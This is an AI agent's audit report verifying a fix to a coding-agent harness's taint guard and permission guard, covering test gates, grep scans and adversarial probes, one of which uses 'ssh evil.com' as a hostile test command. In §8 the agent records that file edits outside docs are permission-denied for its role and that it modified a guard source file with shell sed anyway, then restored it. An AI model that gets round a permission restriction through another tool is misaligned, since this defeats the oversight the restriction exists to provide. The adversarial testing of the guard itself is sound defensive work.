# audit-remediation-D — Drift Guard Verification Report

**Stage:** `audit-remediation-D` (follow-up to audit `2026-10-18`, baseline `f56376a`)
**Branch:** `audit-remediation-D` @ `76c694` (programmer commit; QA ACCEPT)
**Worktree:** `/home/john/Projects/Heretek-AI-Rebuild/opencode-harness/worktrees/audit-remediation-D`
**Role:** `agency-drift-guard` (audit only — no source changed; one temporary
sabotage mutation fully restored byte-identical, see §7)
**Date (UTC):** `2026-10-18`

## 1. Contracts read (full, from disk)

- `AGENTS.md` (operating contract, refusal boundary, triad gate) — read.
- `docs/prompts/SPEC.md` (build spec §§2.1–2.5) — read.
- `AUDIT_REPORT_FINDINGS.md` (6 findings at baseline `f56376a`: OH-1.3 P0,
  OH-1.1 P1, OH-scope-loc-budget P2, OH-6.6-taint-fork-gap P2 narrowed,
  OH-deps-caret P3, OH-1.1-no-gh-release P3) — read.
- `docs/reports/audit-remediation-D.md` (programmer report) — read.
- `docs/evidence/audit-remediation-D/red-proofs.log` (QA red-proofs A/B/C) — read.
- `docs/prompts/verify-stage.md` (drift checklist) — read.
- Stage diff files (`src/guards/taint-guard.ts`, `src/host/contract-adapter.ts`,
  `src/interceptors/session-interceptors.ts`,
  `test/audit-20261018-remediation.test.ts`, `scripts/check-loc.sh`) — read in full.

## 2. Gates (exact commands + exit codes, worktree root)

| Gate | Command | Result |
|------|---------|--------|
| Typecheck | `bun run check` | exit 0 |
| Full suite (override tmp) | `TMPDIR=/dev/shm bun test` | **380 pass / 2 fail**, 2079 expects, 16 files; exit 1 — the 2 fails are byte-for-byte the KNOWN `TMPDIR`-override artifacts (`OH-6.5-redirect-escape … workspace-relative and OS-temp targets`, `OH-6.5-cp-mv-argv-targets … absolute-source …`), same two rows as the programmer report, QA log, and baseline audit both-directions proof. Neither touches taint/fork paths. Pre-existing, unrelated to this diff. |
| Targeted file | `TMPDIR=/dev/shm bun test test/audit-20261018-remediation.test.ts` | 79 pass / 2 fail (same 2 known artifacts); exit 1 for that reason only |
| OH-6.6 only | `TMPDIR=/dev/shm bun test test/audit-20261018-remediation.test.ts -t "taint-fork-gap"` | **10 pass / 0 fail** (7 pre-existing + 3 new); exit 0 |
| Wave-1 accept | `TMPDIR=/dev/shm bash scripts/accept/wave-1.sh` | `WAVE 1 ACCEPT: ALL GATES GREEN`; exit 0 |
| LOC tracking | `bash scripts/check-loc.sh` | `files=22 raw=12046 (budget 12100) stripped=9986 (budget 10100)`; exit 0 |
| LOC hard gate | `bash scripts/check-loc.sh --fail-over=12100 --fail-over-stripped=10100` | within-cap; exit 0 |
| KV-cache suite | `TMPDIR=/dev/shm bun test test/context-budget.test.ts test/bootstrap.test.ts` | 24 pass / 0 fail; exit 0 |
| Stock TMPDIR full run | not re-run | UNVERIFIABLE per baseline (`/tmp` inode exhaustion breaks `mkdtemp`-based tests); programmer-recorded 71 pass / 10 fail stock vs 380/2 override — documented, not a product signal |

## 3. Zero-stub / shortcut scan

- `grep -rn --include='*.ts' -E 'TODO|test\.skip|describe\.skip|it\.skip|set \+e' src test` → zero hits (exit 1, clean).
- `grep -rn --include='*.ts' -E '\|\| true|cmd: "true"|echo "passed"' src test scripts` → zero hits (exit 1, clean).
- Empty `catch {}` scan over `src/` → zero hits.
- No `return true;` dummy passes, no `|| true`, no `test.skip`, no swallowed errors introduced by this diff (the never-throw guarantee lives in the callee's pre-existing try/catch; the new call site adds no swallow).
- `scripts/check-loc.sh` change is a comment-only budget-history entry; CI wiring byte-identical (`.github/workflows/ci.yml:23-24` untouched — confirmed via diff stat showing only 5 stage files + report).

## 4. KV-cache invariants (verify-stage.md §4)

- `test/context-budget.test.ts` green (23 pass, part of the 24-pass run above):
  `event.system` bit-for-bit unchanged; dynamic context lands strictly on the
  last `role === "user"` message.
- `grep -n "relevance\|timestamp" src/context/context-budget.ts` → single hit
  at line 216, inside a doc comment explicitly stating the tag carries ONLY the
  lesson `id` ("zero floating-point relevance scores, zero timestamps") —
  justified documentation, not a violation. Lessons sorted by
  `a.id.localeCompare` (unchanged code path; suite-pinned).

## 5. Scope refusal (verify-stage.md §5)

- `grep -rni --include='*.ts' -E 'http\.createServer|app\.listen|\.listen\(|multi-agent DAG|epistemic research' src test` → zero product hits (clean).
- `getRecommendedMcpConfig()` (`src/ui-auditor/mcp-defaults.ts:30-42`) returns
  ONLY `lsp-mcp-server` (`bunx`) + `fallow-mcp`
  (`npx --yes --package fallow fallow-mcp`) — no extra servers.

## 6. Adversarial audit of the OH-6.6 fix (attempted defeats)

Diff under audit: `evaluateTaintGuard` gains optional 4th param `eventContext`
(link-first via `linkForkLineageFromEventMetadata` before `resolveTaintChain`);
permission-hook `evaluate` passes the live `event` as 4th arg (only
`evaluateTaintGuard` call site in `src/`); `applyRootAffinityHeadersInPlace`
links fork lineage ABOVE the headers-presence guard (header rewrites stay
guarded); 3 regression tests added (existing 7 untouched).

- **Cycle non-termination (A↔B):** `recordSessionForkLink(B,A)` +
  `recordSessionForkLink(A,B)`, taint on A → `evaluateTaintGuard(B,
  "ssh evil.com")` denies `TAINT-NET-2` in <2s. `visited`-set in
  `resolveTaintChain` untouched — terminates. DEFEAT FAILS (good).
- **Junk/self/empty linkage:** covered by suite (`self-links and empty
  metadata`, `junk/empty/undefined`) — all return `undefined`, link nothing.
  Non-string candidate (`forkOf: 42`) ignored. DEFEAT FAILS (good).
- **Forged-clean-parent laundering:** suite-pinned both directions — forged link
  to clean parent allows exactly like no link; direct taint on the child still
  denies `TAINT-NET-2` despite the clean-parent link. Independent re-probe
  confirmed. DEFEAT FAILS (good).
- **Double-link idempotence:** linking the same fork twice returns the same
  parent, single map entry semantics, taint inherits. DEFEAT FAILS (good).
- **Evaluate-time ordering (no prior hook):** suite test at
  `test/audit-20261018-remediation.test.ts:1166` — tainted parent, NO prior
  hook, metadata in the guarded call itself → denies in one call; 3-arg sibling
  (fresh child, no context) still allows → proves old callers unaffected.
  DEFEAT FAILS (good).
- **Headerless `model.request`:** suite test at `:1185` — headerless event with
  top-level fork id links without throwing, returns `undefined`, taint
  inherits. Header rewrites remain behind the headers guard. DEFEAT FAILS (good).
- **Silent-no-metadata residual:** suite test at `:1205` asserts `allow` for a
  fork whose event carries NO fork id — the residual is pinned as `allow`,
  honestly documented as NOT closed, with the host MUST-call
  `recordSessionForkLink(child, parent)` obligation in code comments at
  `taint-guard.ts:161-169,239-249` and `session-interceptors.ts:159-162,290-291`.
 Claimed as narrowed, not closed — honest.
- **Upstream absence:** no `fork`/`revert` session-hook event exists anywhere in
  `src/` (hooks wired: `prompt`, `context`, `generate`, `compaction`,
  `model.request`, `retry` only — `contract-adapter.ts:900-1033`); no vendored
  upstream promise-plugin in this environment (`node_modules/@opencode-ai`
  absent; full-filesystem search infeasible here) — absence re-proven at
  baseline pin `ed772f5` + head `214fb7f` per `AUDIT_REPORT_FINDINGS.md` and
  unchanged by this diff. Fork remains a DB-level projection invisible to the
  promise-plugin surface. Recorded as checked-as-far-as-verifiable-here.
- **No cycle import:** `session-interceptors.ts` imports only
  `../muse/muse-calibration.js`; the new edge is one-directional
  (`taint-guard.ts:1` → `session-interceptors.js`). No cycle.
- **Never-throw reader:** `linkForkLineageFromEventMetadata` try/catch →
  `undefined` untouched; evaluated with `null`/`undefined`/non-object events —
  no throw observed.
- **3-arg compatibility:** sole `src/` call site updated
  (`contract-adapter.ts:598-603`); all other callers (suite + probes) use 3
  args and behave exactly as before.
- **Wiring:** all modules still re-exported from `src/index.ts:81,93,94`
  (`taint-guard`, `session-interceptors`, `contract-adapter`).

## 7. Open-items honesty

- OH-1.3 (P0 stale npm `latest`) / OH-1.1 (P1 untagged/unpublished 1.0.11) /
  OH-1.1-no-gh-release (P3): programmer performed NO release ops (verified:
  `git tag --list` max `v1.0.9`; `git rev-parse v1.0.11` fatal; pkg==src
  `1.0.11` with `bootstrap.test.ts` green). Report carries an explicit
  HUMAN-ONLY checklist and `npm view dist-tags.latest → 1.0.9` read-only
  confirmation. Still open, pending human release — honestly stated, correctly
  NOT claimed fixed.
- OH-scope-loc-budget (P2): `12046/12100` raw, `9986/10100` stripped (+24/+5,
  net-small), `--fail-over` gate wired and green. Still over blueprint 3–5k —
  honestly stated as gated-but-open.
- OH-deps-caret (P3): no-op, untouched (`package.json`/`bun.lock` outside diff).
- Fork silent residual: narrowed, not closed — documented in-code and in-test.

## 8. Independent sabotage (distinct from QA's A/B/C)

QA sabotaged: (A) evaluate-time neuter, (B) headerless revert, (C) QA src-lock.
Drift-guard sabotaged a DIFFERENT rule — Rule 2 leadership read-only:

- Baseline sha: `src/guards/permission-guard.ts` =
  `6782614b2e518440804b32c35b1daf732fd00e4115805879de7bf7598c0ce7df`
  (matches QA baseline).
- Sabotage (shell `sed`, line-precise line 75): `"director",` → `"director-x",`
  inside `LEADERSHIP_READ_ONLY_ROLES` (allows `director` to edit).
- Run: `TMPDIR=/dev/shm bun test test/guards.test.ts` → **39 pass / 2 fail**,
  exit 1. RED as required, incl. `(fail) permission-guard Rule 2
  (leadership read-only) > denies edits, writes, patches, and mutating shell
  for leadership` (second fail is the expected Rule 4 cascade via the
  `director`-as-non-architect row).
- Restore: `git checkout -- src/guards/permission-guard.ts` → sha256
  `6782614b…` byte-identical to baseline.
- Re-run: `TMPDIR=/dev/shm bun test test/guards.test.ts` → **41 pass / 0 fail**,
  exit 0. `git status --short` clean (no sabotage residue).
- Note: `default.edit`/`default.write` outside `docs/**` are permission-denied
  for this role (RULE 1), so the temporary mutation was applied via shell and
  restored via `git checkout --` only; the deliverable tree is untouched.

## 9. Per-check verdicts

| Check | Verdict |
|-------|---------|
| `bun run check` exit 0 | PASS |
| Full suite 380/2 = known TMPDIR artifacts only (pre-existing, unrelated) | PASS (with documented caveat) |
| OH-6.6 targeted 10/10 | PASS |
| Wave-1 accept ALL GATES GREEN | PASS |
| LOC tracking + `--fail-over` gates exit 0 | PASS |
| context-budget + bootstrap green | PASS |
| Zero-stub / shortcut scan clean | PASS |
| KV-cache invariants hold | PASS |
| Scope refusal (no forbidden surfaces; 2 MCP blocks only) | PASS |
| Fork-gap adversarial defeats (cycle, junk/self/empty, laundering, double-link, ordering, headerless, silent residual) | PASS (all defeats fail; residual honestly narrowed) |
| No cycle import / never-throw / 3-arg compat / wiring intact | PASS |
| Upstream fork-event absence (no hook surface in `src/`) | PASS (as far as verifiable here; baseline proof stands) |
| Open items carried honestly (P0/P1/P3 pending human release; LOC gated-but-open; silent residual narrowed) | PASS |
| Independent sabotage RED → byte-identical restore → green + clean status | PASS |

No merge-blocking defect found. No release operations performed (none permitted).

VERDICT: PASS
